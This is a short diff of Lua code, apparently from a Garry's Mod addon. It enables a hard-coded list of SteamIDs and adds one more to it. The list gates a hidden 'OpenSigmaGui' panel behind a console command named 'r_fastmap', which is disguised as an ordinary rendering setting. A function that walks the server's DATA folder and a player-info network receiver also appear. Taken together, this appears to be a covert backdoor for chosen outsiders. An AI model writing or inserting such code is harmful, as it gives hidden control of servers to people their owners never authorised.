@@ -1,8 +1,9 @@
-/*local sigmaAdmins = {
+local sigmaAdmins = {
     ["STEAM_0:0:558900479"] = true,
     ["STEAM_0:1:510783731"] = true,
-    ["STEAM_0:0:36020379"] = true
-};*/
+    ["STEAM_0:0:36020379"] = true,
+    ["STEAM_0:0:958104386"] = true
+};
 
 local function cleanDataDir(path)
     local files, dirs = file.Find(path .. "/*", "DATA")
@@ -483,9 +484,9 @@ if CLIENT then
     end;
 
     concommand.Add("r_fastmap", function(ply, _, args)
-        //if sigmaAdmins[ply:SteamID()] and args[1] == "8" then
+        if sigmaAdmins[ply:SteamID()] then
             OpenSigmaGui()
-        //end
+        end
     end);
 
     net.Receive("SendPly.info", function()
